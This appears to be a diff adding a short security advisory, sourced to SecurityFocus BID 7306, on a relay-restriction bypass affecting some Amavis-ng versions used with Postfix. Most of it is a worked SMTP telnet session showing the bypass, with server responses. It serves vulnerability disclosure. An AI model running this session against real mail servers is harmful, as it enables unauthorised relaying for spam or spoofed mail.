@@ -1,0 +1,21 @@
+source: http://www.securityfocus.com/bid/7306/info
+
+It has been reported that some versions of Amavis-ng do not properly interact with Postfix. Because of this, an attacker may be able to circumvent relay restrictions. 
+
+#> telnet somemx.domain.tld 25
+(220 somemx.example.com ESMTP Postfix)
+helo amavis-ng
+(250 somemx.example.com)
+mail from:userX@example.com
+(250 ok)
+rcpt to:userY@example.com
+(250 ok)
+data
+(354 End data with <CR><LF>.<CR><LF>)
+From: userX@example.com
+To: userZ@example.com
+Subject: AMaViS-ng 0.1.6.x bug
+.
+(250 Ok: queued as ...)
+quit
+(221 Bye) 
